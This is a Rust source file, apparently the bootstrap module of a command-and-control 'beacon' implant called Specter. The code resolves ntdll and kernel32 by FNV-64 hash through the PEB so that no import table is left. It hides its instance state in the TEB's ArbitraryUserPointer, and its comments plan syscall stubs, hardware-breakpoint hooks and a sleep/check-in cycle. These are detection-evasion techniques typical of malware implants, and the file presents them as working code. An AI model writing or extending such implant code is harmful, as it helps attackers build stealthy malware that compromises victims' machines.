//! Beacon bootstrap (port of `src_beacon/src/runtime/` bootstrap paths).
//!
//! `spt_main` runs before anything else: it resolves the core modules by
//! FNV-64 hash through the PEB (no import table), stores the instance in
//! `TEB->NtTib.ArbitraryUserPointer` (no globals, fully reentrant), and
//! enters the main loop. The loop keeps a data dependency on the instance
//! so the linker cannot dead-code-eliminate the bootstrap: the resolved
//! module bases are read on every iteration until phase 2 replaces this
//! loop with the real sleep/check-in cycle.

use core::ffi::c_void;
use core::ptr;

use specter_core::config;
use specter_core::fnv::{fnv1a64, fnv1a64_wide_ascii_ci};
use specter_core::peb::{self, Peb};

/// Beacon instance (port of `SPT_INSTANCE`): the single per-beacon state,
/// stored in `TEB->NtTib.ArbitraryUserPointer` and passed explicitly to
/// everything — never a global. Grows per phase; today: watermark (from the
/// build config) and the resolved module bases.
pub struct Instance {
    pub watermark: u32,
    pub ntdll: *mut c_void,
    pub kernel32: *mut c_void,
}

/// Module name hashes, computed at compile time (lowercase; resolution is
/// case-insensitive — see fnv1a64_utf16_ci).
const H_NTDLL: u64 = fnv1a64_wide_ascii_ci("ntdll.dll");
const H_KERNEL32: u64 = fnv1a64_wide_ascii_ci("kernel32.dll");
const H_GET_PROCESS_HEAP: u64 = fnv1a64(b"GetProcessHeap");

/// Read the PEB (`gs:[0x60]`).
///
/// # Safety
///
/// Windows x64 only; valid once the process has a TEB (always true when
/// the beacon runs).
#[inline]
pub unsafe fn get_peb() -> *mut Peb {
    let peb: *mut Peb;
    core::arch::asm!(
        "mov {}, qword ptr gs:[0x60]",
        out(reg) peb,
        options(nostack, preserves_flags),
    );
    peb
}

/// Store the instance in `TEB->NtTib.ArbitraryUserPointer` (`gs:[0x30]+0x28`).
///
/// # Safety
///
/// The pointer must stay valid for the beacon's lifetime; the entry stub's
/// stack frame never returns, so an instance owned by `spt_main` is valid.
#[inline]
pub unsafe fn store_instance(instance: *mut Instance) {
    core::arch::asm!(
        "mov rcx, gs:[0x30]",
        "mov qword ptr [rcx + 0x28], {}",
        in(reg) instance,
        lateout("rcx") _,
        options(nostack),
    );
}

/// Recover the instance from the TEB (port of the `G_INSTANCE` macro).
///
/// # Safety
///
/// Only after `store_instance` ran on this thread.
#[inline]
pub unsafe fn instance() -> *mut Instance {
    let inst: *mut Instance;
    core::arch::asm!(
        "mov rcx, gs:[0x30]",
        "mov {}, qword ptr [rcx + 0x28]",
        out(reg) inst,
        lateout("rcx") _,
        options(nostack, preserves_flags),
    );
    inst
}

/// Resolve the core modules by hash. Phase 2 extends this with ntdll
/// syscall stubs and the hardware-breakpoint hook setup.
unsafe fn bootstrap(instance: &mut Instance) {
    let peb = get_peb();
    instance.ntdll = peb::find_module(peb, H_NTDLL);
    instance.kernel32 = peb::find_module(peb, H_KERNEL32);
    // Resolved and consumed in phase 2 (heap + syscalls); the resolution
    // itself is exercised here so the export walk is part of the bootstrap.
    if !instance.kernel32.is_null() {
        peb::find_export(instance.kernel32, H_GET_PROCESS_HEAP);
    }
}

/// Beacon main, called by the entry stub. Never returns.
///
/// # Safety
///
/// Only reachable through `SptEntry`: no arguments, no return.
pub unsafe fn main() -> ! {
    let mut instance = Instance {
        watermark: config::WATERMARK,
        ntdll: ptr::null_mut(),
        kernel32: ptr::null_mut(),
    };
    bootstrap(&mut instance);
    store_instance(&mut instance);
    loop {
        // Keep a live data dependency on the resolved bases until the real
        // sleep/check-in cycle lands (phase 2+): if the walk failed, exit
        // silently instead of spinning forever.
        if instance.ntdll.is_null() || instance.kernel32.is_null() {
            break;
        }
        core::hint::spin_loop();
    }
    // Unreachable failure exit for phase 1; phase 2 replaces it with
    // RtlExitUserThread(0) resolved by hash.
    loop {
        core::hint::spin_loop();
    }
}
